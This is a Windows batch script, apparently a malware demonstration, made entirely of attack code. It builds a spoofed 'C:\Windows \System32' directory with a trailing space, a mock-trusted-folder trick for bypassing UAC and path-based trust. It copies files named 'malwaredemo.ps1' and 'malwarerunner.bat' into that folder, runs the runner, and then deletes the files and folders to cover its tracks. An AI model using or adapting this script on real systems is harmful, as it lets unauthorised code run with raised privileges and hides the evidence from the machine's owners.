@echo off
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
ECHO F|xcopy "malwaredemo.ps1" "C:\Windows \System32\" /K /D /H /Y
ECHO F|xcopy "malwarerunner.bat" "C:\Windows \System32\" /K /D /H /Y
"C:\Windows \System32\malwarerunner.bat"
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32"
rmdir "C:\Windows \"
exit
